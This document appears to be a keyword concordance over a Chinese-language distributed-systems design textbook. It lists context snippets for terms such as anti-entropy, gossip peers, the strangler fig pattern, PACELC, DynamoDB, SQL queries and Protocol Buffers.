  c26_b04.md: ...有了它，只要任意 W 个节点可达，写可用性就近乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线...
  c26_b04.md: ...只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增...
  c26_b04.md: ...这种持续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...
  c26_b04.md: ...有了它，只要任意 W 个节点可达，写可用性就近乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线...
  c26_b04.md: ...只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增...
  c26_b04.md: ...这种持续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...
  c26_b06.md: ...调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：...
  c26_b07.md: ...quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器解决集群成...
  c26_b13.md: ...可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置存储展示了高写入吞吐 Redis——现在我...
  c28_b14.md: ...低（写到任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功） | 中 **Merkle tree anti-entropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本） | 中 **Gos...

=== entropy (10 occurrences) ===
  c26_b04.md: ...要任意 W 个节点可达，写可用性就近乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间...
  c26_b04.md: ...(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节...
  c26_b04.md: ...续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...
  c26_b04.md: ...要任意 W 个节点可达，写可用性就近乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间...
  c26_b04.md: ...(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节...
  c26_b04.md: ...续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...
  c26_b06.md: ...ocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中...
  c26_b07.md: ...m 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器解决集群成员问题 5. *...
  c26_b13.md: ...——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置存储展示了高写入吞吐 Redis——现在我们理解生产版该存...
  c28_b14.md: ...任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功） | 中 **Merkle tree anti-entropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本） | 中 **Gossip prot...

=== peer (10 occurrences) ===
  c26_b05.md: ...：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T 秒从集群中随机选一个 peer 2. 向该 peer 发送自己对当前集群状态...
  c26_b05.md: ...是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T 秒从集群中随机选一个 peer 2. 向该 peer 发送自己对当前集群状态的看法（认为哪些节点活着/死了、它们的位置、它们的数据） 3. 将 pee...
  c26_b05.md: ...，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T 秒从集群中随机选一个 peer 2. 向该 peer 发送自己对当前集群状态的看法（认为哪些节点活着/死了、它们的位置、它们的数据） 3. 将 peer 的状态与自己的合并...
  c26_b05.md: ...eer 2. 向该 peer 发送自己对当前集群状态的看法（认为哪些节点活着/死了、它们的位置、它们的数据） 3. 将 peer 的状态与自己的合并，取知识的并集  像谣言在社交网络中传播一样，信息指数级传播：一轮后 2 个节点知道消息；两轮后 4...
  c26_b05.md: ...ssip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开...
  c26_b05.md: ...keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff...
  c26_b05.md: ...响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schem...
  c26_b06.md: ...kle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,00...
  c26_b10.md: ...集群设计 gossip 协议参数，使集群状态在 10 秒内全集群传播。每次 gossip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gos...
  c26_b10.md: ...全集群传播。每次 gossip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gossip 传播建模为指数增长。fanout 为 1 时，k...

=== strangler (10 occurrences) ===
  c27_b06.md: ...、超出时间著称，并且会复制被替代系统的 bug（因为团队正在重新学习旧系统隐式处理的所有边界情况）。  替代方案是 **strangler fig** 模式：让新系统与旧系统并存，逐步将流量从旧系统路由到新系统，每块验证后再继续。  隐喻：绞杀榕围绕寄主树生...
  c27_b08.md: ...迁移是局部的：只有哈希位置落在新节点位置与其前驱之间的用户需要移动。操作可增量完成，无需停机。  **Q2.** 解释 strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧...
  c27_b08.md: ...*Q2.** 解释 strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧系统逐步并行构建，流量逐渐从旧系统重定向到新系统，一次一个功能或服务。旧系统继续运行直到新系统处理...
  c27_b08.md: ...统用人工数据测试；生产流量会揭示未预料的问题。(4) 团队低估范围（侯世达定律：任务总是比预期长，即使考虑侯世达定律）。Strangler fig 避免所有这些问题：新系统的每一块都在真实生产流量验证后才开始下一块。  **Q3.** 为什么康威定律认为 8...
  c27_b08.md: ...迁移是局部的：只有哈希位置落在新节点位置与其前驱之间的用户需要移动。操作可增量完成，无需停机。  **Q2.** 解释 strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧...
  c27_b08.md: ...*Q2.** 解释 strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧系统逐步并行构建，流量逐渐从旧系统重定向到新系统，一次一个功能或服务。旧系统继续运行直到新系统处理...
  c27_b08.md: ...统用人工数据测试；生产流量会揭示未预料的问题。(4) 团队低估范围（侯世达定律：任务总是比预期长，即使考虑侯世达定律）。Strangler fig 避免所有这些问题：新系统的每一块都在真实生产流量验证后才开始下一块。  **Q3.** 为什么康威定律认为 8...
  c27_b10.md: ...能值得。  **Q2.** SocialSnap 团队决定因性能原因把通知服务从 Python 重写成 Go。设计一个 strangler fig 迁移计划，让他们能在生产流量中验证新的 Go 服务，同时保持即时回滚能力。  提示  思考如何同时把流量路由到...
  c27_b13.md: ...—它是理性借债。分类法（故意、无意、bit rot、架构）帮助团队优先偿还哪笔债务。架构债务最昂贵，应明确标记。  **Strangler fig 模式** 是大型迁移的安全方法：让新系统与旧系统并存，逐步转移流量，保持回滚能力。大爆炸重写几乎从不奏效。...
  c28_b15.md: ...** (Ch 28) | 极低（代码靠近用户） | 有限（无中央 DB 访问） | 极高 | 中——边缘部署流水线 **Strangler fig migration** (Ch 27) | 无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须...

=== apache (9 occurrences) ===
  c02_b07.md: ...—它关乎跨节点的共识。持久性是数据在故障后是否幸存并可检索的保证——它关乎随时间的持久化。  **持久但不强一致：** Apache Cassandra 在默认设置下。每次写都持久化到磁盘（durable）并复制到多个节点。但如果你配置成优先可用性（r...
  c08_b04.md: ...布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为它塑造了行业对事件驱动系统的思...
  c10_b18.md: ...ng）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写。对上述查询，数据库只读取 `user_id`、`...
  c14_b04.md: ...数据库（PostgreSQL、MySQL）是 CP：它们宁愿拒绝读也不返回陈旧数据。Amazon DynamoDB 和 Apache Cassandra 是 AP：即使在分区期间也继续提供读，代价是可能返回陈旧数据。  CAP 定理常被误解为“三选二”...
  c18_b03.md: ...负载测试在 staging 环境（镜像生产架构但使用较小实例和测试数据）上运行真实流量模式。Locust、k6 或 Apache JMeter 等工具模拟数百或数千并发用户发请求。  设计良好的负载测试：  1. **渐进加压**——从低流量开始线...
  c20_b06.md: ...而是消费者把 10,000 个事件批量一次 INSERT——把写放大降低 10,000 倍。  分析数据库可用专门工具：Apache Kafka（队列） feeding  Apache Clickhouse 或数据仓库（分析存储）。用户通过分析 API...
  c20_b06.md: ...RT——把写放大降低 10,000 倍。  分析数据库可用专门工具：Apache Kafka（队列） feeding  Apache Clickhouse 或数据仓库（分析存储）。用户通过分析 API 查询点击数，而不是查主数据库。  这种架构展示了第...
  c21_b06.md: ...d` 分片，同一对话的消息落在同一分片，保留对话历史快速的单分片索引扫描。随着系统增长，增加分片可分散写负载。  或者，Apache Cassandra（第 6 章的列族存储）正是为该访问模式设计：Cassandra 的数据模型天然按 partitio...
  c26_b07.md: ...它证明高度可用、无主、最终一致的键值存储在生产规模可行，并给了行业一套具体机制（不只是原则）来实现它。  现代系统包括 Apache Cassandra、Riak 和 DynamoDB（托管云服务）都是 Dynamo 设计的直系后裔。当你在 Socia...

=== tbps (9 occurrences) ===
  c03_b04.md: ...3. 平均视频码率：约 5 Mbps（1080p HD） 4. 总带宽需求：2300 万 × 5 Mbps = 115 Tbps 5. 一台带 40 Gbps 网络链路的 CDN 服务器可服务：40,000 Mbps / 5 Mbps = 8000...
  c24_b01.md: ...分钟  **约束（证据）：**  * 1 亿（100 million）同时观众 × 5 Mbps 平均码率 = 500 Tbps 出站带宽 * 热门内容（最热 1% 视频）约占 80% 观看量 * 上传：每分钟上传 500 小时视频（YouTube...
  c24_b01.md: ...uTube 规模） * 长尾内容：99% 视频总观看次数少于 100 次  **问题：** 如何在全球持续交付 500 Tbps 带宽、启动时间 < 2 秒，同时管理 250 PB（petabyte）内容库？  * * *...
  c24_b04.md: ...CDN——真正的交付引擎  回到需求：1 亿（100 million）同时观众 × 5 Mbps 平均码率 = 500 Tbps 出站带宽。  没有任何单一数据中心——甚至 10 个数据中心——能在全球低延迟下提供 500 Tbps 出站带宽。伦敦...
  c24_b04.md: ...率 = 500 Tbps 出站带宽。  没有任何单一数据中心——甚至 10 个数据中心——能在全球低延迟下提供 500 Tbps 出站带宽。伦敦到美国弗吉尼亚数据中心的往返延迟约 100ms。这意味着伦敦观众请求下一片段时要等 100ms 才有字节...
  c24_b10.md: ...= 625 KB/s。新加坡边缘总带宽：10 million × 625 KB/s = 6.25 TB/s = 50 Tbps。全球层面：1 亿（100 million）观众 × 625 KB/s = 62.5 TB/s = 500 Tbps 总...
  c24_b10.md: ...0 Tbps。全球层面：1 亿（100 million）观众 × 625 KB/s = 62.5 TB/s = 500 Tbps 总计。新加坡服务 1000 万 / 1 亿 = 10% 全球流量 = 50 Tbps。这说明了 CDN 容量规划是巨大...
  c24_b10.md: ...62.5 TB/s = 500 Tbps 总计。新加坡服务 1000 万 / 1 亿 = 10% 全球流量 = 50 Tbps。这说明了 CDN 容量规划是巨大的基础设施投资：单个区域集群必须配备 50 Tbps，需要数千台带 100Gbps 网...
  c24_b10.md: ...= 10% 全球流量 = 50 Tbps。这说明了 CDN 容量规划是巨大的基础设施投资：单个区域集群必须配备 50 Tbps，需要数千台带 100Gbps 网卡的服务器及多条冗余 100Gbps 上行光纤。  **Q2.** 回忆第 7 章，缓...

=== elc (9 occurrences) ===
  c04_b03.md: ...PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC 读作：**PA/ELC**——“如果存在分区（Partition），在可用性（Availability）和一致性（Consistency）之间...
  c04_b03.md: ...**之间 tradeoff：  * **P → A/C：** 分区期间，牺牲可用性或一致性（与 CAP 相同） * **ELC：** 否则（正常运行时），牺牲延迟或一致性  plain 语言：即使网络工作正常，强一致性也要付出延迟代价。要保证每次...
  c04_b07.md: ...以为标着“ACID”的数据库在分布式多主设置下也会正确表现。  **Q3.** PACELC 如何扩展 CAP？为什么“ELC”（否则：延迟 vs 一致性）部分通常比分区行为在实践中更重要？  **答案：** PACELC 扩展了 CAP，因为它...
  c04_b07.md: ...的日常 tradeoff（权衡）：要保证强一致性，每次读/写必须跨副本协调，这花费延迟。要降低延迟，就放松一致性。  “ELC”部分（否则：延迟 vs 一致性）在实践中更重要，因为：...
  c04_b08.md: ...年可能发生几次。但每个请求、每天每毫秒，都面临延迟 vs 一致性 tradeoff（权衡）。 2. **用户感受到的是 ELC，而不是分区行为。** 如果分区期间服务不可用 30 秒，用户会注意到并感到沮丧。但如果每个请求都因为你要同步协调三个副...
  c04_b08.md: ...ogle、Amazon 和 Netflix 都写过，页面加载时间增加 100ms 会显著降低用户参与度。对这些公司来说，ELC tradeoff（为一致性支付延迟的权衡）是直接的业务指标。  CAP 的分区行为告诉你系统在紧急情况下会做什么。PA...
  c04_b08.md: ...ff（为一致性支付延迟的权衡）是直接的业务指标。  CAP 的分区行为告诉你系统在紧急情况下会做什么。PACELC 的 ELC tradeoff（权衡）告诉你系统每天每分钟的表现。...
  c04_b10.md: ...方法可以被接受？  提示  把每家银行在分区期间的行为映射到 CAP 选择（C vs A）。然后思考 PACELC 的“ELC”维度：每家银行在正常（非分区）运行时交易什么？答案不是简单的“银行里正确性总是赢”——想想哪些银行产品可能合理地容忍最...
  c04_b12.md: ...最终一致性是合适的。如果你的光标在同事屏幕上短暂偏了一行，影响微乎其微。低延迟至关重要——看到自己光标移动必须感觉即时。ELC 选择坚定地选 L（延迟）：快速响应，接受短暂不一致。  **文档内容本身：** 强一致性或简单最终一致性都不太对。如果...

=== dynamodb (9 occurrences) ===
  c04_b04.md: ...本确认 | | Cassandra（默认设置） | A | L | 分区期间继续服务请求；单节点确认即接受写入 | | DynamoDB | A | L | 默认最终一致性；强一致读可用，但延迟更高 | | Zookeeper | C | C | 用于协调...
  c04_b05.md: ...eed 没看到你的帖子。3 秒后他们再刷新，看到了。这是可接受的最终一致性。  **例子 2：冲突的购物车。** 你用 DynamoDB（最终一致性）存储购物车。你在手机上加了台笔记本，然后立刻在笔记本浏览器上加了个键盘。两次添加在复制之前被写到不同节点。...
  c06_b01.md: ...键值存储（Key-Value Store） | Key → 不透明 value | 极致速度，简单 | Redis, DynamoDB, Memcached | | 列族存储（Column-Family Store） | 行含多列，按列查询 | 宽行、时...
  c06_b06.md: ...许你要求写入被所有副本确认（强一致性，类似 ACID），代价是降低可用性；或只被一个副本确认（最终一致性，最大可用性）。DynamoDB 也提供“强一致读”选项。区别不是 ACID 或没有；而是一个可以调节的谱系。  同样，“关系型数据库总是一致的”也错误...
  c06_b12.md: ...能导致有害的药物相互作用。同样，实验室结果值必须准确。这排除了默认最终一致的系统，如 Cassandra 或默认配置的 DynamoDB。任何影响治疗决策的数据都需要 ACID 保证。  **第 4 步：规模。** 一家拥有数千名患者的医疗初创公司数据量很...
  c14_b04.md: ...数据）。  传统关系型数据库（PostgreSQL、MySQL）是 CP：它们宁愿拒绝读也不返回陈旧数据。Amazon DynamoDB 和 Apache Cassandra 是 AP：即使在分区期间也继续提供读，代价是可能返回陈旧数据。  CAP 定理常...
  c14_b04.md: ...复制因子与 Quorum——可调一致性  在“始终强一致”和“始终最终一致”之间有一系列可配置选项。Cassandra、DynamoDB、Riak 等分布式数据库允许你通过 **quorum** 机制按操作配置一致性级别。   #### 定义：复制因子...
  c14_b05.md: ...性，没有一致性保证。读可能返回陈旧数据。这本质上是最终一致性。   #### 实践中的可调一致性  Cassandra、DynamoDB（多种模式）和类似系统允许你按操作指定一致性级别：  * `QUORUM`：W=floor(N/2)+1，R=floor...
  c26_b07.md: ...模可行，并给了行业一套具体机制（不只是原则）来实现它。  现代系统包括 Apache Cassandra、Riak 和 DynamoDB（托管云服务）都是 Dynamo 设计的直系后裔。当你在 SocialSnap 缓存中使用 Redis 时，你使用的是一...

=== desc (9 occurrences) ===
  c05_b02.md: ...HERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行...
  c05_b06.md: ...;     CREATE INDEX idx_posts_created_at ON posts(created_at DESC);         CREATE INDEX idx_follows_followed_id ON follows(f...
  c05_b06.md: ...er_id = 1  -- Alice 的 user_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `po...
  c05_b10.md: ...ers WHERE username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;  有了 `idx_mentions_user_id`，数据库先找到 Alice 的 `us...
  c05_b12.md: ...FROM posts     WHERE user_id = 42     ORDER BY created_at DESC     LIMIT 20;  **为什么需要索引：** 如果没有 `user_id` 索引，数据库会执行全表扫描——读...
  c05_b12.md: ...。数据库读 1000 万行来返回 1000 行——浪费比 10000:1。  `ORDER BY created_at DESC` 又增加第二个问题：即使过滤后，数据库也必须按时间戳排序匹配行，除非索引已经按顺序返回它们。  **最佳索引：** `...
  c05_b12.md: ...必须按时间戳排序匹配行，除非索引已经按顺序返回它们。  **最佳索引：** `(user_id, created_at DESC)` 复合索引：      CREATE INDEX idx_posts_user_created ON posts(u...
  c05_b12.md: ...E INDEX idx_posts_user_created ON posts(user_id, created_at DESC);  这个索引用一个结构服务查询的两部分。数据库找到 B-tree 中 `user_id = 42` 的部分（O(lo...
  c12_b05.md: ...post_id, like_count     FROM posts     ORDER BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结...

=== follows (9 occurrences) ===
  c05_b06.md: ...ed_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE follows (         follower_id INTEGER REFERENCES users(id) ON DELET...
  c05_b06.md: ...d_at DESC);         CREATE INDEX idx_follows_followed_id ON follows(followed_id);  **为什么这样设计 schema：**  `users` 表上的 `follower_c...
  c05_b06.md: ...（denormalized counters）**——这个计数本来可以通过 `SELECT COUNT(*) FROM follows WHERE followed_id = user_id` 推导，但规模上去后这个查询会变贵。我们直接存储计数，并在每次...
  c05_b06.md: ...我们直接存储计数，并在每次关注/取消关注时更新它（在事务内）。这是系统设计中一个关键模式的预演：预计算昂贵的聚合。  `follows` 表上的 `PRIMARY KEY (follower_id, followed_id)` 有两个作用：它创建唯一约束...
  c05_b06.md: ...t, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id     JOIN users ON po...
  c05_b06.md: ...username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id     JOIN users ON posts.user_id = users.id...
  c05_b06.md: ...wed_id     JOIN users ON posts.user_id = users.id     WHERE follows.follower_id = 1  -- Alice 的 user_id     ORDER BY posts.crea...
  c05_b06.md: ...R BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `posts.created_at` 上有合适的索引，当 Alice 关注的人数合理（几...
  c05_b14.md: ...p v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限制前处理数万到数十万用户。  这些限制——单机写入能力、存储限制和...

=== insert (9 occurrences) ===
  c05_b11.md: ...列（我们在 5.4 节的 schema 中已经勾勒过）。每次点赞时在事务内原子递增：      BEGIN;     INSERT INTO likes (user_id, post_id) VALUES (456, 12345);     UPDA...
  c05_b11.md: ...景，方案 2（反规范化计数器）是行业标准选择。大表上的计数查询很贵，而点赞数一天被读数百万次。一致性风险通过把计数器与 insert/delete 放在同一事务中更新来管理。这遵循与 SocialSnap v1 的 `follower_count` 和...
  c05_b13.md: ...器前失败，或相反。随着时间推移，计数器偏离真实值。  事务通过让两个操作原子化来防止：      BEGIN;     INSERT INTO follows (follower_id, followed_id) VALUES (1, 2);...
  c05_b13.md: ...lowing_count + 1 WHERE id = 1;     COMMIT;  如果事务中任何操作失败——包括 INSERT 和 UPDATE 之间崩溃——数据库会在重启时利用预写日志回滚所有更改。`follows` 表和计数器总是一起更新，要...
  c08_b07.md: ...↓     Application Server (HTTP handler)         ↓ 1. Insert user into PostgreSQL (REQUIRED — user must exist)         ↓...
  c20_b05.md: ...个 URL） 4. 生成随机 7 字符 base-62（BASE）码 5. 尝试插入 `urls` 表    * 如果 INSERT 成功（无冲突）：返回 `{"short_url": "short.ly/abc1234"}`    * 如果因唯一约束...
  c20_b06.md: ...取并批量写入分析数据库。批量写入关键：不是每秒 116,000 次单独插入，而是消费者把 10,000 个事件批量一次 INSERT——把写放大降低 10,000 倍。  分析数据库可用专门工具：Apache Kafka（队列） feeding  Ap...
  c25_b06.md: ...tatus = 'COMPLETED_UNBILLED' THEN         -- 计算最终车费         INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, fare...
  c25_b06.md: ...(trip_id, amount, type) VALUES (X, fare, 'CHARGE');         INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, driv...

=== memcached (9 occurrences) ===
  c06_b01.md: ...Value Store） | Key → 不透明 value | 极致速度，简单 | Redis, DynamoDB, Memcached | | 列族存储（Column-Family Store） | 行含多列，按列查询 | 宽行、时间序列、分析 | Ca...
  c07_b03.md: ...式缓存（进程外）  **分布式缓存** 是一个单独的服务——专用缓存服务器或集群——所有应用服务器共享。Redis 和 Memcached 是典型例子。  所有应用服务器访问同一个缓存。一台服务器上的缓存命中为所有服务器预热缓存。缓存 survives 应用...
  c07_b06.md: ...作为安全网：条目在缓存满时（LRU）或停留太久时（TTL）被驱逐，以先发生者为准。   ### 7.6 Redis 与 Memcached——两个主力军  两种分布式缓存系统主导行业使用：**Redis** 和 **Memcached**。两者都是内存型键值...
  c07_b06.md: ...7.6 Redis 与 Memcached——两个主力军  两种分布式缓存系统主导行业使用：**Redis** 和 **Memcached**。两者都是内存型键值存储，设计为亚毫秒延迟。   #### Memcached  Memcached 是两者中更老、...
  c07_b06.md: ...行业使用：**Redis** 和 **Memcached**。两者都是内存型键值存储，设计为亚毫秒延迟。   #### Memcached  Memcached 是两者中更老、更简单的。它是纯键值缓存：你存字符串，取字符串。没有数据类型、没有持久化、没有复制...
  c07_b06.md: ...s** 和 **Memcached**。两者都是内存型键值存储，设计为亚毫秒延迟。   #### Memcached  Memcached 是两者中更老、更简单的。它是纯键值缓存：你存字符串，取字符串。没有数据类型、没有持久化、没有复制（基础版）。Memca...
  c07_b06.md: ...ached 是两者中更老、更简单的。它是纯键值缓存：你存字符串，取字符串。没有数据类型、没有持久化、没有复制（基础版）。Memcached 集群使用 consistent hashing 跨节点分区数据（我们将在第 9 章研究）。如果一个节点失败，其数据丢失...
  c07_b06.md: ...回”。它的简单性使纯字符串缓存的每次操作比 Redis 略快。  **局限：** 如果你想缓存有序列表、集合或计数器——Memcached 把所有东西存为字符串，因此应用必须在每次访问时序列化和反序列化整个结构。递增计数器需要取回字符串、反序列化、在应用代码...
  c07_b17.md: ...缓存放置**选择（客户端、CDN、应用级、分布式）各有 tradeoff（权衡）。对大多数多服务器应用，Redis 或 Memcached 这类分布式缓存是正确默认。  **Cache-aside** 是最常见模式：先查缓存，未命中时取数据库，填充缓存，返回...

=== crud (9 occurrences) ===
  c08_b06.md: ...件会累积。你需要快照策略（定期把当前状态保存为检查点，这样就不必从时间起点重放所有事件）。  学习曲线：事件溯源需要与 CRUD（Create-Read-Update-Delete）编程根本不同的心智模型。不熟悉的团队会犯可预见的错误。   ###...
  c08_b15.md: ...#### 深入思考  **Q1.** 事件溯源把所有状态变更存为不可变事件日志。传统 CRUD 只存当前状态。一家初创公司在构建个人理财应用——用户连接银行账户并跟踪支出。创始人在争论是否使用事件溯源。为该场景提出...
  c08_b15.md: ...这就是导致它的所有事件。  时间查询变得简单：“我 1 月 1 日余额是多少？”重放到 12 月 31 日即可。在传统 CRUD 系统中，这需要一个单独的“余额历史”表——手动实现事件溯源自动提供的东西。  Bug 恢复更安全：如果 bug 导致错...
  c08_b15.md: ...提供的东西。  Bug 恢复更安全：如果 bug 导致错误计算，你可以修复计算逻辑并重放所有事件以得到正确当前状态。在 CRUD 系统中，写入数据库的错误状态可能无法恢复。  **反对事件溯源的理由：**  学习曲线陡峭。大多数开发者熟悉 CRUD...
  c08_b15.md: ...CRUD 系统中，写入数据库的错误状态可能无法恢复。  **反对事件溯源的理由：**  学习曲线陡峭。大多数开发者熟悉 CRUD。事件溯源需要根本不同的心智模型。事件模型中的 bug 微妙且难诊断。对时间紧、团队小的初创公司，这种学习投入可能令人望...
  c08_b15.md: ...公司，这种学习投入可能令人望而却步。  当前状态查询要么需要重放事件（大规模时慢），要么需要维护读模型投影（复杂）。在 CRUD 系统中，“用户当前余额是多少？”是 `SELECT balance FROM accounts WHERE user_...
  c08_b15.md: ...件。对正确性至上的金融应用，管理补偿事件需要仔细设计。  **推荐：**  对个人理财初创公司，混合方案效果好：用传统 CRUD 数据库（`transactions` 表）作为事实来源，并将其设计为不可变交易/事务日志（从不更新或删除行，只插入）。...
  c09_b08.md: ...I 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42                   → fetch user 42...
  c09_b09.md: ...端建不同端点”的问题。  **线索：内部服务间高频调用** → gRPC。性能和强类型值得设置成本。  **线索：简单 CRUD 操作，API 表面小且稳定** → REST。GraphQL 的复杂度不合理。  **线索：实时双向通信** → We...

=== buffers (9 occurrences) ===
  c09_b09.md: ...C 是 Google 开发的高性能 RPC（Remote Procedure Call）框架。它使用 Protocol Buffers（protocol buffer 协议，Protobuf）做序列化——一种二进制协议格式，比 JSON 紧凑得多、解析更...
  c09_b09.md: ...浏览器支持有限（gRPC 需要 HTTP/2 特性，浏览器仅通过 gRPC-Web 部分支持） * Protocol Buffers schema 管理需要工具 * 对简单外部 API 杀鸡用牛刀  **何时选 gRPC：** 内部服务间通信，性能重要...
  c13_b13.md: ...二人团队现在把一半时间花在运维开销和服务间协调上，而不是构建产品。  **Q2.** gRPC 使用 Protocol Buffers（protocol buffer 协议，二进制序列化格式），而 REST 使用 JSON（文本格式）。一位同事说：“JS...
  c13_b13.md: ...讨论：** 这位同事的说法对小负载和低流量大致正确。一次传输几百字节、每秒几百次的请求，JSON 和 Protocol Buffers 在端到端延迟上差别可忽略。  在特定场景下这个说法会崩：  **高容量服务间通信：** 如果 User Service...
  c13_b13.md: ...反序列化中等复杂度的 JSON 对象（比如 2-5 KB），JSON 解析消耗的 CPU 时间会累积。Protocol Buffers 对同等数据的解析速度是 JSON 的 3-10 倍。在这个规模上，差异是可测量的。  **大负载：** JSON 把数...
  c13_b13.md: ...**大负载：** JSON 把数字表示成字符串（`"count": 12345` 占 12 字节；Protocol Buffers 编码同样整数只需 1-2 字节）。对包含数千条记录的响应，这种差异会放大。100 KB 的 JSON 响应用 Prot...
  c13_b13.md: ...整数只需 1-2 字节）。对包含数千条记录的响应，这种差异会放大。100 KB 的 JSON 响应用 Protocol Buffers 可能只要 30 KB——影响带宽和反序列化时间。  **流场景：** gRPC 支持单条 HTTP/2 连接上的双向流...
  c13_b14.md: ...Protocol Buffers（protocol buffer 协议）真正的优势主要不是性能，而是**契约强制（contract enforcemen...
